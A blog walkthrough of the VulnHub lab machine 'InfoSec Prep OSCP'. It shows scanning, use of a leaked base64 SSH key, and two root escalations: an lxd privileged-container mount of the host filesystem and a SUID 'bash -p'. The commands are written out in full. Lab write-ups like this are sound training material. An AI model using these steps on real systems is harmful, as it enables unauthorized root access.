---
layout: post
title: InfoSec Prep OSCP - Vuln Hub Machine
description: >
    Detailed walkthrough  of the machine Infosec Prep OSCP that was released on VulnHub 11 Jul 2020 by FalconSpy 
sitemap: false
categories: [VulnHub]
permalink: /:categories/InfoSec_Prep_OSCP.html
---
* toc
{:toc .large-only}

## Machine Summary
Machine has a web application running, upon enumerating the directories /secret.txt contains a SSH Private key which is encoded in base64. After decryption, we can login as user **oscp** with the SSH Private key. we can esclate the privileges to root in two ways 1. Exploiting the lxd group 2. Exploiting the SUID - Bash

## Nmap Scan
As the golden rule i started with nmap scan
```bash
nmap -sC -sV -p- 192.168.0.101
```
![](https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/1.png)
It has two ports open 

| Port         | Service           |
|:-------------|:------------------|
| 22           | ssh               |
| 80           | http              |
| 33060        | mysqlx            |

## Enumeration on Port 80

I started to enumerate on the site, it was a wordpress site so i ran a wpscan on it but nothing poped up. I manually enumerated on the site but i ended up with no usefull information for enumeration
![](https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/2.png)

I ran gobuster on the site to enumerate the files and directories
```bash
gobuster dir -u http://192.168.0.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,conf
```
![](https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/3.png)

secret.txt seems to be interesting, I opened it on the browser

![](https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/5.png)

## Acquiring User Shell
It was encoded on base64 so i decoded it, viewing that it was a SSH private key 
```bash
echo "Base64_Hash" |base64 -d >> id_rsa
```
We need some usernames to login through ssh using the private key so i tried guessing username and username ***oscp*** worked.
We also need to add permissions to the private key
```bash
chmod 600 id_rsa
```
I logged in onto the machine using the private key for the user oscp
```bash
ssh -i id_rsa oscp@192.168.0.101
```
![](https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/6.png)

## Privilege Escalation

I enumerated the machine with current privilege as oscp, found two things that could grant us root shell

1. User is part of lxd group
2. Suid was configured for /usr/bin/bash

By these two ways, we can proceed to root.

## Privilege Escalation through Exploiting lxd group 

**LXC** —short for “Linux containers”, is a solution for virtualizing software at the operating system level within the Linux kernel.

**LXD** is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the  local lxd group.
ie. a low privilege user can create a bridge between sockets on the host and its containers. when bridging from an existing socket on the host to a new socket in a container, it makes the connection with the credentials of the LXD service. so when user speaks to the container, the messages (command) and it lands on the container with root privileges (commands are executed with the root)

Executing lxc directly didn't work so i tried executing it with the full path of the binary file ie. /snap/bin/lxc
```bash
/snap/bin/lxc
```
First i created a storage pool
```bash
/snap/bin/lxd init
```
I moved on with the default settings, now we need to create a container called test 
```bash
/snap/bin/lxc init ubuntu:18.04 test -c security.privileged=true
```
We configure that container such that all the files and folders of the host is copied or present in /mnt/root directory
```bash
/snap/bin/lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
```
Now we need to start the container called test
```bash
/snap/bin/lxc start test
```
We execute the container
```
/snap/bin/lxc exec test bash
```

![](https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/7.png)

Now we go into the directory **/mnt/root/root** to get the flag.txt

![](https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/8.png)

**This exploit methodolgy will only work when the target machine has access to internet**
{:.note title="Attention"}

## Exploiting the misconfigured SUID - bash

**SUID** - SUID is nothing but a special permission bit available in Linux, that achieves this with a lot of ease. If you are the owner of an executable file, with the help of SUID permission set, other users will be running the executable with your  permission and not theirs. 

We can list the binaries with SUID permissions using the command below
```bash
find / -perm -u=s -type f 2>/dev/null
```
![](https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/9.png)
![](https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/10.png)

Bash was the juicy binary. we can exploit it to get the root privilege

[**GetFoBins**](https://gtfobins.github.io/#+suid)

```bash
bash -p
``` 
This granted us the shell with root privilege

![](https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/11.png)

Happy Hacking !